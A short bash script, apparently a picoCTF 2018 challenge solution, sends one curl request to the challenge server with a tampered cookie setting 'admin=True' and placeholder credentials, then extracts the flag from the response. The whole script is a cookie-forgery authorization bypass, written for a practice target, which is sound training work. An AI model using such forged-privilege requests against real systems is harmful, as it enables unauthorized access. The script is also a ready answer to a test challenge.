#!/bin/bash

# Dealing with the cookie and editing it. Get the flag, then copy the GET request to cURL.
curl -s 'http://2018shell.picoctf.com:6153/flag' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Referer: http://2018shell.picoctf.com:6153/' -H 'Connection: keep-alive' -H 'Cookie: _ga=GA1.2.477249786.1581956260; _gid=GA1.2.988845797.1581956260; password=any; username=any; admin=True' -H 'Upgrade-Insecure-Requests: 1' -H 'Cache-Control: max-age=0' | grep -oE "picoCTF{.*}" --color=none
